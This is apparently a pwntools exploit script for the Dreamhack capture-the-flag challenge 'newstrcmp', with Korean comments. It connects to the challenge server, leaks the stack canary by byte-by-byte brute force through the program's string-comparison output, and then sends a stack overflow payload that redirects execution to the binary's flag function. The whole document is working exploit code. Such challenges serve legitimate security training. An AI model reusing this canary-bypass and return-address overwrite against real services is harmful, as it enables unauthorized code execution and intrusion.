from pwn import *

# p = process("./newstrcmp")
p = remote("host8.dreamhack.games", 10957)
e = ELF("./newstrcmp")

def input_string(s1, s2):
    p.sendlineafter(b': ', b'n')
    p.sendlineafter(b's1: ', s1)
    p.sendlineafter(b's2: ', s2)
    
# pause()
input_string(b'A'*0x18+b'\n', b'A'*0x18)  # Initialize the strings
# pause()
# canary leak
canary = b'\n'  # canary는 항상 \x00으로 시작

for i in range(1, 8):  # 나머지 7바이트 brute-force
    for j in range(256):
        guess = canary + bytes([j])  # 현재까지 알아낸 값 + 새 바이트 시도
        payload = b'A'*0x18 + guess   # 카나리까지 덮는 패딩

        input_string(payload, b'A'*0x18)
        try:
            output = p.recvline(timeout=1)
            # print(output)
            # pause()
            if str(25+i).encode() in output:
                canary += bytes([j])
                print(f"[+] Found canary byte {i}: {hex(j)}")
                # pause()
                break
        except EOFError:
            print(f"[-] Byte {hex(j)} caused crash")
            continue
canary = u64(b'\x00'+canary[1:])
print(f"[+] Canary: {hex(canary)}")

payload = b'c'*0x18+ p64(canary) +p64(1)+ p64(e.symbols['flag'])  # canary + win 함수 주소
pause()
input_string(b'b'*0x18, payload)  # win 함수 호출
p.sendlineafter(b': ', b'y')  # win 함수 호출 후 확인


p.interactive()